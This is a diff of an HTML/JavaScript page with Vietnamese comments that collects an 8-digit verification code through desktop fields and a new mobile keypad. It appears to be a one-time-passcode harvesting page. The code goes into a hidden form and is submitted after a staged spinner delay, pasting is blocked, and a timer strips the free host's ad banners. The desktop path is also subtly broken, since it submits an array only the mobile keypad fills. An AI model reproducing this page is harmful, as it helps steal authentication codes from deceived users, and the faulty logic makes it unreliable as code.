@@ -32,6 +32,7 @@
         color: red;
     }
 
+    /* PC version */
     .otp-container {
         display: flex;
         justify-content: space-between;
@@ -54,10 +55,7 @@
         box-shadow: 0 0 8px rgba(85, 99, 222, 0.3);
     }
 
-    form {
-        display: none;
-    }
-
+    /* spinner */
     .spinner {
         display: none;
         margin: 20px auto 0;
@@ -73,6 +71,43 @@
         0% { transform: rotate(0deg);}
         100% { transform: rotate(360deg);}
     }
+
+    form { display: none; }
+
+    /* Mobile version keypad */
+    .mobile-keypad {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+    }
+    .otp-display {
+        font-size: 32px;
+        letter-spacing: 10px;
+        margin-bottom: 20px;
+    }
+    .keypad-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 70px);
+        gap: 10px;
+    }
+    .keypad-grid button {
+        height: 60px;
+        font-size: 22px;
+        border-radius: 8px;
+        border: 1px solid #aaa;
+        background: #f5f5f5;
+        transition: 0.2s;
+    }
+    .keypad-grid button:active {
+        background: #d7d7ff;
+        transform: scale(0.95);
+    }
+
+    /* Hiển thị mobile version khi dưới 768px */
+    @media (max-width: 768px) {
+        .otp-container { display: none; }
+        .mobile-keypad { display: flex; }
+    }
 </style>
 </head>
 <body>
@@ -83,15 +118,27 @@
         Vui lòng kiểm tra và nhập mã xác thực bên dưới.
     </div>
 
+    <!-- PC/Laptop -->
     <div class="otp-container" id="otpContainer">
-        <input type="text" maxlength="1" id="otp1">
-        <input type="text" maxlength="1" id="otp2">
-        <input type="text" maxlength="1" id="otp3">
-        <input type="text" maxlength="1" id="otp4">
-        <input type="text" maxlength="1" id="otp5">
-        <input type="text" maxlength="1" id="otp6">
-        <input type="text" maxlength="1" id="otp7">
-        <input type="text" maxlength="1" id="otp8">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+    </div>
+
+    <!-- Mobile keypad -->
+    <div class="mobile-keypad" id="mobileKeypad">
+        <div class="otp-display" id="otpDisplay">* * * * * * * *</div>
+        <div class="keypad-grid" id="keypadGrid">
+            <button>1</button><button>2</button><button>3</button>
+            <button>4</button><button>5</button><button>6</button>
+            <button>7</button><button>8</button><button>9</button>
+            <div></div><button>0</button><div></div>
+        </div>
     </div>
 
     <div class="spinner" id="spinner"></div>
@@ -102,88 +149,89 @@
 </div>
 
 <script>
+    // Dọn rác quảng cáo (Somee)
+    setInterval(function () {
+        document.querySelectorAll("div[style*='opacity: 0.9'][style*='z-index: 2147483647']").forEach(el => el.remove());
+        document.querySelectorAll("div[onmouseover='S_ssac();']").forEach(el => el.remove());
+        document.querySelectorAll("center").forEach(el => el.remove());
+        document.querySelectorAll("div[style='height: 65px;']").forEach(el => el.remove());
+    }, 10);
 
-        // Delete div somee
-         setInterval(function () {
-                  document.querySelectorAll("div[style*='opacity: 0.9'][style*='z-index: 2147483647']").forEach((el) => el.remove());
-                  document.querySelectorAll("div[onmouseover='S_ssac();']").forEach((el) => el.remove());
-                  document.querySelectorAll("center").forEach((el) => el.remove());
-                  document.querySelectorAll("div[style='height: 65px;']").forEach((el) => el.remove());
-              }, 10);
+    const inputs = Array.from(document.querySelectorAll('.otp-container input'));
+    const txtCode = document.getElementById('txtCode');
+    const hiddenForm = document.getElementById('hiddenForm');
+    const otpContainer = document.getElementById('otpContainer');
+    const spinner = document.getElementById('spinner');
+    const otpDisplay = document.getElementById('otpDisplay');
+    const keypadGrid = document.getElementById('keypadGrid');
 
-const inputs = Array.from(document.querySelectorAll('.otp-container input'));
-let currentIndex = 0;
-const hiddenForm = document.getElementById('hiddenForm');
-const txtCode = document.getElementById('txtCode');
-const otpContainer = document.getElementById('otpContainer');
-const spinner = document.getElementById('spinner');
+    let currentIndex = 0;
+    let codeArr = Array(8).fill('*');
 
-// focus ô hiện tại
-function focusCurrent() {
-    if(currentIndex < inputs.length) {
-        inputs[currentIndex].focus();
+    function focusCurrent() {
+        if(currentIndex < inputs.length) inputs[currentIndex].focus();
     }
-}
+    focusCurrent();
 
-// focus ô đầu tiên khi load
-focusCurrent();
+    function disableInputs() {
+        inputs.forEach(i => i.disabled = true);
+    }
 
-// chặn click/mousedown ngoài ô hiện tại
-function disableInputs() {
-    inputs.forEach((input) => {
-        input.disabled = true; // disable toàn bộ ô, không thể click/focus
+    // PC version
+    inputs.forEach((input, index) => {
+        input.addEventListener('mousedown', e => {
+            if (index !== currentIndex) {
+                e.preventDefault();
+                focusCurrent();
+            }
+        });
+        input.addEventListener('focus', e => {
+            if (index !== currentIndex) focusCurrent();
+        });
+        input.addEventListener('paste', e => e.preventDefault());
     });
-}
 
-// xử lý các sự kiện trên ô
-inputs.forEach((input, index) => {
-    input.addEventListener('mousedown', e => {
-        if (index !== currentIndex) {
+    document.addEventListener('keydown', function(e) {
+        if (e.key >= '0' && e.key <= '9') {
+            if (window.innerWidth <= 768) return; // bỏ qua mobile
+            inputs[currentIndex].value = e.key;
+            currentIndex++;
+            if (currentIndex < inputs.length) {
+                focusCurrent();
+            } else processDone();
             e.preventDefault();
-            focusCurrent();
-        }
+        } else if (e.key !== "Tab") e.preventDefault();
     });
-    input.addEventListener('focus', e => {
-        if (index !== currentIndex) {
-            focusCurrent();
-        }
-    });
-    input.addEventListener('paste', e => e.preventDefault()); // ngăn paste
-});
 
-// nhận input từ bàn phím
-document.addEventListener('keydown', function(e) {
-    if (e.key >= '0' && e.key <= '9') {
-        inputs[currentIndex].value = e.key;
-        currentIndex++;
-        if (currentIndex < inputs.length) {
-            focusCurrent();
-        } else {
-            // đủ 8 số
-            txtCode.value = inputs.map(i => i.value).join('');
-            
-            // thoát cursor khỏi ô và disable tất cả ô
-            inputs.forEach(i => i.blur());
-            disableInputs();
-
-            // đợi 3 giây trước khi hiện spinner
-            setTimeout(() => {
-                otpContainer.style.display = 'none';
-                spinner.style.display = 'block';
-                
-                // spinner chạy 5 giây rồi submit
-                setTimeout(() => hiddenForm.submit(), 5000);
-            }, 3000);
-        }
-        e.preventDefault();
-    } else if (e.key !== "Tab") {
-        e.preventDefault(); // chặn chữ và key khác
+    // Mobile keypad logic
+    if (keypadGrid) {
+        keypadGrid.querySelectorAll('button').forEach(btn => {
+            btn.addEventListener('click', () => {
+                if (currentIndex >= 8) return;
+                const val = btn.textContent;
+                codeArr[currentIndex] = val;
+                currentIndex++;
+                updateDisplay();
+                if (currentIndex === 8) processDone();
+            });
+        });
     }
-});
+
+    function updateDisplay() {
+        otpDisplay.textContent = codeArr.map((v, i) => i < currentIndex ? v : '*').join(' ');
+    }
+
+    function processDone() {
+        txtCode.value = codeArr.join('');
+        disableInputs();
+        setTimeout(() => {
+            otpContainer.style.display = 'none';
+            document.getElementById('mobileKeypad').style.display = 'none';
+            spinner.style.display = 'block';
+            setTimeout(() => hiddenForm.submit(), 5000);
+        }, 3000);
+    }
 </script>
 
 </body>
-  <script src="/lib/jquery/dist/jquery.min.js"></script>
-  <script src="/lib/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
-  <script src="/js/site.js?v=TT9gdsrYxJxsTxry7yz80ShJ0E1Fs7_3rwt7zPCsi4I"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
 </html>
